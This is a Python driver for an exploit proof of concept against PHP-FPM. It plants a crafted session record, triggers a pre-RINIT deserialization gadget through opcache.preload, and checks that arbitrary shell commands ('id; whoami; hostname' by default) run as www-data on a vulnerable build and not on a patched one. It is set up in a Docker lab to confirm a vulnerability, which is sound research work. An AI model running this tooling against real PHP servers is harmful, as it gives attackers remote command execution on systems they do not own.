#!/usr/bin/env python3
"""Driver for preload_rinit.py: confirms the pre-RINIT session-deserialization ->
opcache.preload gadget __wakeup() path differentially -- POSITIVE on vuln
8.4.26-fpm (:8911, gadget runs, uid present), NEGATIVE on patched 8.4.27-fpm
(:8912, does not run). PASS requires both, proving it is the pre-RINIT decode.

Bring up the lab:
    docker compose -f docker-compose.apps.yml -p p2s-preloadrinit --profile preloadrinit up -d
    python3 -I poc/routes/verify_preload_rinit.py
"""
import argparse
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import preload_rinit as pr  # noqa: E402


def run_case(url, container, cmd, timeout):
    import secrets
    sid = secrets.token_hex(12)
    record = pr.make_record(cmd)
    pr.docker_exec(container, "rm -f " + pr.shlex.quote(pr.MARKER), check=False)
    pr.plant_session(container, pr.DEFAULT_SESSION_DIR, sid, record)
    status, reason, body = pr.send(url, sid, timeout)
    import time
    time.sleep(0.2)
    proof = pr.read_marker(container)
    output = pr.framed_output(body)
    fired = bool(proof) or output is not None
    text = (proof or output or b"").decode(errors="replace").strip()
    # pre-RINIT proof: the gadget frame sits BEFORE the index.php JSON body
    pre_rinit = body.find(pr.BODY_BEGIN) >= 0 and (
        body.find(pr.BODY_BEGIN) < body.find(b'"ok"') or body.find(b'"ok"') < 0
    )
    return fired, text, pre_rinit, status


def main(argv):
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--cmd", default="id; whoami; hostname")
    ap.add_argument("--timeout", type=float, default=30.0)
    args = ap.parse_args(argv)

    print("=== preload_rinit verify (CVE-2026-109619 pre-RINIT __wakeup) ===")

    print("\n[POSITIVE] vuln 8.4.26-fpm :8911")
    pos_fired, pos_text, pos_pre, pos_status = run_case(
        pr.DEFAULT_URL, pr.DEFAULT_CONTAINER, args.cmd, args.timeout)
    pos_uid = "uid=" in pos_text
    print(f"  HTTP {pos_status}  fired={pos_fired}  uid_present={pos_uid}  pre_RINIT={pos_pre}")
    for line in pos_text.splitlines():
        print("    " + line)

    print("\n[NEGATIVE] patched 8.4.27-fpm :8912")
    neg_fired, neg_text, _neg_pre, neg_status = run_case(
        pr.FIXED_URL, pr.FIXED_CONTAINER, args.cmd, args.timeout)
    print(f"  HTTP {neg_status}  fired={neg_fired}  (expected fired=False)")
    for line in neg_text.splitlines():
        print("    " + line)

    ok = pos_fired and pos_uid and pos_pre and not neg_fired
    print("\nRESULT: " + ("PASS" if ok else "FAIL"))
    if ok:
        print("  vuln build ran gadget pre-RINIT as www-data; patched build did not.")
    else:
        print("  conditions not met: "
              f"pos_fired={pos_fired} pos_uid={pos_uid} pos_pre={pos_pre} neg_fired={neg_fired}")
    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
